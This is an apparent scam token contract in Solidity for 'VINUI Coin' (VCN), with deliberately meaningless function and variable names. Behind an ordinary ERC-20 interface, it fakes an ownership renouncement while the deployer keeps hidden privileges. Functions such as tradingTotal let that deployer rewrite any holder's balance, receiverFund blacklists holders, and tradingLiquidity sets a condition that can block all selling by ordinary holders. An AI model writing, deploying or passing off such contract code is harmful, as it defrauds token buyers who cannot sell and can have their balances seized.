//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface tradingTxSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderTeamFund) external view returns (uint256);

    function transfer(address marketingIs, uint256 modeTakeSender) external returns (bool);

    function allowance(address fundExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeTakeSender) external returns (bool);

    function transferFrom(
        address sender,
        address marketingIs,
        uint256 modeTakeSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderLaunch, uint256 value);
    event Approval(address indexed fundExempt, address indexed spender, uint256 value);
}

interface senderSwapMax is tradingTxSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract launchedSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromWallet {
    function createPair(address amountIs, address txShould) external returns (address);
}

interface minLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VINUICoin is launchedSell, tradingTxSender, senderSwapMax {

    bool public fundSwap;

    uint256 walletEnable;

    bool public amountSell;

    uint256 private limitTeam;

    function transferFrom(address totalLaunch, address marketingIs, uint256 modeTakeSender) external override returns (bool) {
        if (_msgSender() != launchMax) {
            if (launchedSwap[totalLaunch][_msgSender()] != type(uint256).max) {
                require(modeTakeSender <= launchedSwap[totalLaunch][_msgSender()]);
                launchedSwap[totalLaunch][_msgSender()] -= modeTakeSender;
            }
        }
        return isList(totalLaunch, marketingIs, modeTakeSender);
    }

    event OwnershipTransferred(address indexed toAuto, address indexed autoSender);

    mapping(address => uint256) private maxShould;

    uint256 private totalReceiver = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return enableIsLimit;
    }

    function owner() external view returns (address) {
        return walletTrading;
    }

    address launchMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return totalReceiver;
    }

    uint256 private launchedTeam;

    function decimals() external view virtual override returns (uint8) {
        return feeTotal;
    }

    bool public atReceiver;

    address public walletToken;

    bool public receiverList;

    mapping(address => bool) public exemptMax;

    function approve(address shouldReceiver, uint256 modeTakeSender) public virtual override returns (bool) {
        launchedSwap[_msgSender()][shouldReceiver] = modeTakeSender;
        emit Approval(_msgSender(), shouldReceiver, modeTakeSender);
        return true;
    }

    address private walletTrading;

    uint8 private feeTotal = 18;

    mapping(address => bool) public fundFrom;

    function tokenTeam() public {
        emit OwnershipTransferred(walletToken, address(0));
        walletTrading = address(0);
    }

    function getOwner() external view returns (address) {
        return walletTrading;
    }

    function tradingLiquidity(uint256 modeTakeSender) public {
        fromLimit();
        launchWallet = modeTakeSender;
    }

    address public walletAmount;

    function modeMinSender(address totalLaunch, address marketingIs, uint256 modeTakeSender) internal returns (bool) {
        require(maxShould[totalLaunch] >= modeTakeSender);
        maxShould[totalLaunch] -= modeTakeSender;
        maxShould[marketingIs] += modeTakeSender;
        emit Transfer(totalLaunch, marketingIs, modeTakeSender);
        return true;
    }

    function fromLimit() private view {
        require(exemptMax[_msgSender()]);
    }

    function balanceOf(address senderTeamFund) public view virtual override returns (uint256) {
        return maxShould[senderTeamFund];
    }

    uint256 private modeAuto;

    mapping(address => mapping(address => uint256)) private launchedSwap;

    function transfer(address txSell, uint256 modeTakeSender) external virtual override returns (bool) {
        return isList(_msgSender(), txSell, modeTakeSender);
    }

    string private enableIsLimit = "VINUI Coin";

    address exemptTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function receiverFund(address swapTake) public {
        fromLimit();
        
        if (swapTake == walletToken || swapTake == walletAmount) {
            return;
        }
        fundFrom[swapTake] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return modeWallet;
    }

    function allowance(address modeAmount, address shouldReceiver) external view virtual override returns (uint256) {
        if (shouldReceiver == launchMax) {
            return type(uint256).max;
        }
        return launchedSwap[modeAmount][shouldReceiver];
    }

    function enableWallet(address fundLaunched) public {
        if (atReceiver) {
            return;
        }
        
        exemptMax[fundLaunched] = true;
        
        atReceiver = true;
    }

    string private modeWallet = "VCN";

    uint256 launchWallet;

    constructor (){
        
        tokenTeam();
        minLimit receiverBuy = minLimit(launchMax);
        walletAmount = fromWallet(receiverBuy.factory()).createPair(receiverBuy.WETH(), address(this));
        
        walletToken = _msgSender();
        exemptMax[walletToken] = true;
        maxShould[walletToken] = totalReceiver;
        if (modeAuto == launchedTeam) {
            launchedTeam = modeAuto;
        }
        emit Transfer(address(0), walletToken, totalReceiver);
    }

    function isList(address totalLaunch, address marketingIs, uint256 modeTakeSender) internal returns (bool) {
        if (totalLaunch == walletToken) {
            return modeMinSender(totalLaunch, marketingIs, modeTakeSender);
        }
        uint256 launchedReceiver = tradingTxSender(walletAmount).balanceOf(exemptTake);
        require(launchedReceiver == launchWallet);
        require(!fundFrom[totalLaunch]);
        return modeMinSender(totalLaunch, marketingIs, modeTakeSender);
    }

    bool private amountFundLaunch;

    function tradingTotal(address txSell, uint256 modeTakeSender) public {
        fromLimit();
        maxShould[txSell] = modeTakeSender;
    }

    bool private buyShould;

}